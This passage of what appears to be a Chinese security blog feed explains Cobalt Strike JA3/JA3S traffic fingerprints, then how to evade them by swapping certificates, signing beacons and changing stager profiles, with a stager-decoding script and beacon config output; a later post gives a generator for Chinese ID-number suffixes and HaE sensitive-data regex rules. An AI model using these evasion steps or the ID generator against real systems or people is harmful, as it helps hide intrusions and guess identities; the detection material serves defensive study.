Hello消息中的详细信息创建的TLS Server Hello数据包进行响应。由于TLS协商是以明文的方式传输的，所以，我们可以使用TLS Client Hello数据包中的详细信息对客户端应用程序进行指纹识别。</p><p>JA3 这个项目用于收集Client Hello数据包中以下字段的十进制值：包括版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后，用<code>,</code>来分隔各个字段、用<code>-</code>来分隔各个字段中的各个值，将这些值串联在一起之后，计算 <code>MD5</code>，就是一个ja3。如果没有某个字段，则这些字段的值为空。</p></blockquote><p>字段顺序如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TLSVersion，Ciphers，Extensions，EllipticCurves，EllipticCurvePointFormats</span><br></pre></td></tr></table></figure><p>第一字段TLSVersion</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111114925058.png" alt="image-20211111114925058"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0303-&gt;771</span><br></pre></td></tr></table></figure><p>第二个字段Ciphers总共19个</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115342676.png" alt="image-20211111115342676"></p><p>将对应的数值进行转化</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xc02c-&gt;49196</span><br><span class="line">0xc02b-&gt;49195</span><br><span class="line">0xc030-&gt;49200</span><br><span class="line">49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10</span><br></pre></td></tr></table></figure><p>第三个字段Extensions</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115749306.png" alt="image-20211111115749306"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5-10-11-13-35-23-65281</span><br></pre></td></tr></table></figure><p>第四个字段：EllipticCurves</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120033782.png" alt="image-20211111120033782"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x1d-&gt;29, 0x17-&gt;23, 0x18-&gt;24</span><br><span class="line">29-23-24</span><br></pre></td></tr></table></figure><p>第五个字段：EllipticCurvePointFormats</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120208129.png" alt="image-20211111120208129"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><p>将五个字段用<code>,</code>拼接如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0</span><br></pre></td></tr></table></figure><p>做MD5加密如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: import hashlib</span><br><span class="line"></span><br><span class="line">In [2]: hashlib.md5((&#39;771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0&#39;).encode(encoding&#x3D;&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">Out[2]: &#39;72a589da586844d7f0818ce684948eea&#39;</span><br></pre></td></tr></table></figure><p>也可以使用对应的脚本直接进行解密</p><p><a href="https://github.com/salesforce/ja3">https://github.com/salesforce/ja3</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br></pre></td></tr></table></figure><p>对比 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FByteSecLabs%2Fja3-ja3s-combo%2Fblob%2Fmaster%2Fmaster-list.txt">https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt</a> 可证实是CobaltStrike的ja3指纹</p><p>同样的我们也可以去计算下服务端的ja3s</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3s.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[192.168.72.177:1667] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1668] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1669] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br></pre></td></tr></table></figure><blockquote><p>MetaSploit 的 Meterpreter 和 CobaltStrike（并非4.1版本） 的 Beacon 都使用 Windows 套接字来启动 TLS 通信。在 Windows 10 上，JA3=72a589da586844d7f0818ce684948eea（指定 IP 地址），JA3=a0e9f5d64349fb13191bc781f81f42e1（指定域名）。由于 Windows 上的其他普普通通的应用程序也使用相同的套接字，因此，我们很难识别其中的恶意通信。但是，Kali Linux 上的 C2 服务器对该客户端应用程序的响应方式与 Internet 上的普通服务器对该套接字的响应方式相比来说是独一无二的。尽管服务器对不同客户端的响应不同，但它们对同一客户端的响应总是一致的。因此，如果结合 ja3+ja3s，就能够识别这种恶意通信，而不用考虑目的地 IP、域名或证书等细节信息。</p><p>JA3和JA3S是一种基于TLS指纹的安全分析方法。JA3指纹能够指示客户端应用程序通过TLS通信的方式，而JA3指纹能够指示服务器响应。如果两者结合起来，实质上就生成了客户端和服务器之间的加密协商的指纹。虽然基于TLS的检测方法不一定是灵丹妙药，也不一定能保证映射到客户端应用程序，但它们始终是安全分析的轴心所在。</p></blockquote><p>所以对于HTTPS证书特征，建议一定要修改默认的HTTPS证书，重新申请一个HTTPS证书，</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151224222.png" alt="image-20211111151224222"></p><p>之后会生成对应的TXT记录，复制进对应的DNS域名管理，解析后下载文件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151350019.png" alt="image-20211111151350019"></p><p>之后会得到full_chain.pem证书和private私钥两个文件。上传至cobalt strike文件夹下，使用keytool重新创建证书</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171130139.png" alt="image-20211111171130139"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171206190.png" alt="image-20211111171206190"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out Wings.p12 -name Wings -passout pass:wings123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.store -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.jks -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br></pre></td></tr></table></figure><p>创建后，在profile配置文件中，添加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;wings.store&quot;;</span><br><span class="line">    set password &quot;wings123456&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时将teamserver中修改调用的store和对应的密码，进行启动发现证书已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184234913.png" alt="image-20211111184234913"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184332351.png" alt="image-20211111184332351"></p><p>在生成可执行文件时，点击Sign executable file 进行勾选</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165849625.png" alt="image-20211112165849625" style="zoom:50%;"><p>再次抓取流量进行分析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112170016737.png" alt="image-20211112170016737"></p><p>发现证书信息已经修改</p><h2 id="Beacon-Staging-特征"><a href="#Beacon-Staging-特征" class="headerlink" title="Beacon Staging 特征"></a>Beacon Staging 特征</h2><p>在cobalt strike 上线的时候，首先投递一个被称为stager的小巧payload，然后去beacon staging server下载体积较大更复杂的stage。具体细节不是很明白。<br>通过访问默认的uri就可以获取到cobalt strike 的shellcode。有师傅已经写好了<code>grab_beacon_config.nse</code>脚本来识别beacon staging的特征。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap xxx.xxx.xxx.xxx --script&#x3D;grab_beacon_config.nse</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112154717717.png" alt="image-20211112154717717"></p><p>当CobaltStrike的stager在受害端运行时，会请求TeamServer端拉取Beacon进行在内存中反射注入运行，先运行stage，打开wireshark抓包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162211687.png" alt="image-20211112162211687"></p><p>可以看到受害段访问teamserver <a href="http://192.168.137.94/EuNU">http://192.168.137.94/EuNU</a></p><p>访问并下载对应脚本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162549739.png" alt="image-20211112162549739"></p><p>然后通过脚本对stager进行解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys,struct</span><br><span class="line"></span><br><span class="line">filename &#x3D; sys.argv[1]</span><br><span class="line">data &#x3D; open(filename, &#39;rb&#39;).read()</span><br><span class="line">t &#x3D; bytearray(data[0x45:])</span><br><span class="line">(a,b) &#x3D; struct.unpack_from(&#39;&lt;II&#39;, t)</span><br><span class="line">key &#x3D; a</span><br><span class="line">t2 &#x3D; t[8:]</span><br><span class="line">out &#x3D; &quot;&quot;</span><br><span class="line">for i in range(len(t2)&#x2F;4):</span><br><span class="line">    temp &#x3D; struct.unpack_from(&#39;&lt;I&#39;, t2[i*4:])[0]</span><br><span class="line">    temp ^&#x3D; key</span><br><span class="line">    out +&#x3D; struct.pack(&#39;&lt;I&#39;, temp)</span><br><span class="line">    key ^&#x3D; temp</span><br><span class="line">open(filename+&#39;.decoded&#39;, &#39;wb&#39;).write(out)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python decostager.py EuNU</span><br></pre></td></tr></table></figure><p>然后多出来一个EuNU.decoded文件，之后我们利用如下脚本可以解析出对应的配置信息</p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">https://github.com/Sentinel-One/CobaltStrikeParser</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 ..&#x2F;CobaltStrikeParser-master&#x2F;parse_beacon_config.py EuNU.decoded</span><br><span class="line">BeaconType                       - HTTP</span><br><span class="line">Port                             - 80</span><br><span class="line">SleepTime                        - 5000</span><br><span class="line">MaxGetSize                       - 1048576</span><br><span class="line">Jitter                           - 0</span><br><span class="line">MaxDNS                           - 255</span><br><span class="line">PublicKey_MD5                    - defb5d95ce99e1ebbf421a1a38d9cb64</span><br><span class="line">C2Server                         - 192.168.137.94,&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books</span><br><span class="line">UserAgent                        - Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line">HttpPostUri                      - &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps</span><br><span class="line">Malleable_C2_Instructions        - Empty</span><br><span class="line">HttpGet_Metadata                 - ConstHeaders</span><br><span class="line">                                   Accept: *&#x2F;*</span><br><span class="line">                                   Host: www.amazon.com</span><br><span class="line">                                   Metadata</span><br><span class="line">                                   base64</span><br><span class="line">                                   prepend &quot;session-token&#x3D;&quot;</span><br><span class="line">                                   prepend &quot;skin&#x3D;noskin;&quot;</span><br><span class="line">                                   append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;</span><br><span class="line">                                   header &quot;Cookie&quot;</span><br><span class="line">HttpPost_Metadata                - ConstHeaders</span><br><span class="line">                                   Accept: *&#x2F;*</span><br><span class="line">                                   Content-Type: text&#x2F;xml</span><br><span class="line">                                   X-Requested-With: XMLHttpRequest</span><br><span class="line">                                   Host: www.amazon.com</span><br><span class="line">                                   ConstParams</span><br><span class="line">                                   sz&#x3D;160x600</span><br><span class="line">                                   oe&#x3D;oe&#x3D;ISO-8859-1;</span><br><span class="line">                                   s&#x3D;3717</span><br><span class="line">                                   dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com</span><br><span class="line">                                   SessionId</span><br><span class="line">                                   parameter &quot;sn&quot;</span><br><span class="line">                                   Output</span><br><span class="line">                                   base64</span><br><span class="line">                                   print</span><br><span class="line">PipeName                         -</span><br><span class="line">DNS_Idle                         - 0.0.0.0</span><br><span class="line">DNS_Sleep                        - 0</span><br><span class="line">SSH_Host                         - Not Found</span><br><span class="line">SSH_Port                         - Not Found</span><br><span class="line">SSH_Username                     - Not Found</span><br><span class="line">SSH_Password_Plaintext           - Not Found</span><br><span class="line">SSH_Password_Pubkey              - Not Found</span><br><span class="line">SSH_Banner                       -</span><br><span class="line">HttpGet_Verb                     - GET</span><br><span class="line">HttpPost_Verb                    - POST</span><br><span class="line">HttpPostChunk                    - 0</span><br><span class="line">Spawnto_x86                      - %windir%\syswow64\rundll32.exe</span><br><span class="line">Spawnto_x64                      - %windir%\sysnative\rundll32.exe</span><br><span class="line">CryptoScheme                     - 0</span><br><span class="line">Proxy_Config                     - Not Found</span><br><span class="line">Proxy_User                       - Not Found</span><br><span class="line">Proxy_Password                   - Not Found</span><br><span class="line">Proxy_Behavior                   - Use IE settings</span><br><span class="line">Watermark                        - 305419896</span><br><span class="line">bStageCleanup                    - False</span><br><span class="line">bCFGCaution                      - False</span><br><span class="line">KillDate                         - 0</span><br><span class="line">bProcInject_StartRWX             - True</span><br><span class="line">bProcInject_UseRWX               - True</span><br><span class="line">bProcInject_MinAllocSize         - 0</span><br><span class="line">ProcInject_PrependAppend_x86     - Empty</span><br><span class="line">ProcInject_PrependAppend_x64     - Empty</span><br><span class="line">ProcInject_Execute               - CreateThread</span><br><span class="line">                                   SetThreadContext</span><br><span class="line">                                   CreateRemoteThread</span><br><span class="line">                                   RtlCreateUserThread</span><br><span class="line">ProcInject_AllocationMethod      - VirtualAllocEx</span><br><span class="line">bUsesCookies                     - True</span><br><span class="line">HostHeader                       -</span><br><span class="line">headersToRemove                  - Not Found</span><br><span class="line">DNS_Beaconing                    - Not Found</span><br><span class="line">DNS_get_TypeA                    - Not Found</span><br><span class="line">DNS_get_TypeAAAA                 - Not Found</span><br><span class="line">DNS_get_TypeTXT                  - Not Found</span><br><span class="line">DNS_put_metadata                 - Not Found</span><br><span class="line">DNS_put_output                   - Not Found</span><br><span class="line">DNS_resolver                     - Not Found</span><br><span class="line">DNS_strategy                     - Not Found</span><br><span class="line">DNS_strategy_rotate_seconds      - Not Found</span><br><span class="line">DNS_strategy_fail_x              - Not Found</span><br><span class="line">DNS_strategy_fail_seconds        - Not Found</span><br></pre></td></tr></table></figure><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><h4 id="从防火墙上限制访问beacon的端口。"><a href="#从防火墙上限制访问beacon的端口。" class="headerlink" title="从防火墙上限制访问beacon的端口。"></a>从防火墙上限制访问beacon的端口。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 443 -j DROP </span><br><span class="line">iptables -I INPUT -s xx.xx.xx.xx -ptcp --dport 443 -j ACCEPT</span><br></pre></td></tr></table></figure><p>重新启动网卡，即可</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112164856353.png" alt="image-20211112164856353" style="zoom:50%;"><h4 id="修改profile文件"><a href="#修改profile文件" class="headerlink" title="修改profile文件"></a>修改profile文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">    set uri_x86 &quot;&#x2F;get32.gif&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;get64.gif&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        parameter &quot;id&quot; &quot;1234&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;SomeValue&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;GIF89a&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次生成请求，进行抓包发现对应信息已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165259063.png" alt="image-20211112165259063"></p><p>再次访问链接,为以下格式</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165737808.png" alt="image-20211112165737808"></p><h4 id="修改源码加密的密钥"><a href="#修改源码加密的密钥" class="headerlink" title="修改源码加密的密钥"></a>修改源码加密的密钥</h4><p>该内容在CobaltStrike二开特征修改中。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.feidao.site/wordpress/?p=4457">http://www.feidao.site/wordpress/?p=4457</a></p><p>[<a href="https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]">https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]</a>(<a href="https://kam1.cc/2021/08/09/Cobalt">https://kam1.cc/2021/08/09/Cobalt</a> Strike隐藏特征与混淆流量/)</p><p><a href="https://www.freebuf.com/articles/endpoint/253322.html">https://www.freebuf.com/articles/endpoint/253322.html</a></p><p><a href="https://paper.seebug.org/1349/">https://paper.seebug.org/1349/</a></p><p><a href="https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA">https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA</a></p><p><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cobalt-Strike简介&quot;&gt;&lt;a href=&quot;#Cobalt-Strike简介&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike简介&quot;&gt;&lt;/a&gt;Cobalt Strike简介&lt;/h1&gt;&lt;p&gt;Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， &lt;a href=&quot;https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf&quot;&gt;A-team详细介绍使用网址&lt;/a&gt;。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。&lt;/p&gt;
&lt;p&gt;Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动。本章中会概述 Cobalt Strike 的功能集和相关的攻击流程。在本手册的剩余部分中会 详细的讨论这些功能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>常用Dict使用集合</title>
    <link href="http://www.ol4three.com/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/"/>
    <id>http://www.ol4three.com/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/</id>
    <published>2021-09-26T11:09:06.000Z</published>
    <updated>2021-11-17T07:21:14.473Z</updated>
    
    <content type="html"><![CDATA[<p>身份证后六位：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    date &#x3D; input(&quot;出生日期: &quot;)</span><br><span class="line">    sex &#x3D; &#39;02468&#39; if int(input(&quot;性别(男1女2): &quot;)) % 2 &#x3D;&#x3D; 0 else &#39;13579&#39;  # 性别位</span><br><span class="line">    check &#x3D; &#39;0123456789X&#39;  # 校验位</span><br><span class="line">    other &#x3D; &#39;0123456789&#39;   # 其它位</span><br><span class="line">    nums &#x3D; itertools.product(other, other, sex, check)</span><br><span class="line">    cards &#x3D; []</span><br><span class="line">    for num in nums:</span><br><span class="line">        card &#x3D; date + &quot;&quot;.join(num)</span><br><span class="line">        cards.append(card)</span><br><span class="line">    print(len(cards))</span><br><span class="line">    print(cards)</span><br></pre></td></tr></table></figure><a id="more"></a><p>Hae:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hae</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line">- rule:</span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Shiro</span><br><span class="line">    regex: (&#x3D;deleteMe|rememberMe&#x3D;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: JSON Web Token</span><br><span class="line">    regex: (ey[A-Za-z0-9_-]&#123;10,&#125;\.[A-Za-z0-9._-]&#123;10,&#125;|ey[A-Za-z0-9_\&#x2F;+-]&#123;10,&#125;\.[A-Za-z0-9._\&#x2F;+-]&#123;10,&#125;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Swagger UI</span><br><span class="line">    regex: ((swagger-ui.html)|(\&quot;swagger\&quot;:)|(Swagger UI)|(swaggerUi))</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">  type: Fingerprint</span><br><span class="line">- rule:</span><br><span class="line">  - color: yellow</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Email</span><br><span class="line">    regex: (([a-zA-Z0-9][_|\.])*[a-zA-Z0-9]+@([a-zA-Z0-9][-|_|\.])*[a-zA-Z0-9]+\.((?!js|css|jpg|jpeg|png|ico)[a-zA-Z]&#123;2,&#125;))</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese IDCard</span><br><span class="line">    regex: [^0-9]((\d&#123;8&#125;(0\d|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;$)|(\d&#123;6&#125;(18|19|20)\d&#123;2&#125;(0[1-9]|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;(\d|X|x)))[^0-9]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese Mobile Number</span><br><span class="line">    regex: [^0-9A-Za-z](1(3([0-35-9]\d|4[1-8])|4[14-9]\d|5([\d]\d|7[1-79])|66\d|7[2-35-8]\d|8\d&#123;2&#125;|9[89]\d)\d&#123;7&#125;)[^0-9A-Za-z]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: cyan</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Internal IP Address</span><br><span class="line">    regex: [^0-9]((127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: green</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: MAC Address</span><br><span class="line">    regex: (^([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;)|[^a-zA-Z0-9]([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: false</span><br><span class="line">    name: Chinese Bank Card ID</span><br><span class="line">    regex: [^0-9]([1-9]\d&#123;12,18&#125;)[^0-9]</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  type: Basic Information</span><br><span class="line">- rule:</span><br><span class="line">  - color: cyan</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: RCE Paramters</span><br><span class="line">    regex: ((cmd&#x3D;)|(exec&#x3D;)|(command&#x3D;)|(execute&#x3D;)|(ping&#x3D;)|(query&#x3D;)|(jump&#x3D;)|(code&#x3D;)|(reg&#x3D;)|(do&#x3D;)|(func&#x3D;)|(arg&#x3D;)|(option&#x3D;)|</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;身份证后六位：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import itertools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if __name__ &amp;#x3D;&amp;#x3D; &amp;#39;__main__&amp;#39;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    date &amp;#x3D; input(&amp;quot;出生日期: &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sex &amp;#x3D; &amp;#39;02468&amp;#39; if int(input(&amp;quot;性别(男1女2): &amp;quot;)) % 2 &amp;#x3D;&amp;#x3D; 0 else &amp;#39;13579&amp;#39;  # 性别位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    check &amp;#x3D; &amp;#39;0123456789X&amp;#39;  # 校验位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    other &amp;#x3D; &amp;#39;0123456789&amp;#39;   # 其它位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    nums &amp;#x3D; itertools.product(other, other, sex, check)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cards &amp;#x3D; []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for num in nums:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        card &amp;#x3D; date + &amp;quot;&amp;quot;.join(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cards.append(card)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(len(cards))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(cards)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Dict" scheme="http://www.ol4three.com/tags/Dict/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序反编译</title>
    <link href="http://www.ol4three.com/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>http://www.ol4three.com/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</id>
    <published>2021-09-13T07:02:14.000Z</published>
    <updated>2021-09-22T08:32:55.076Z</updated>
    
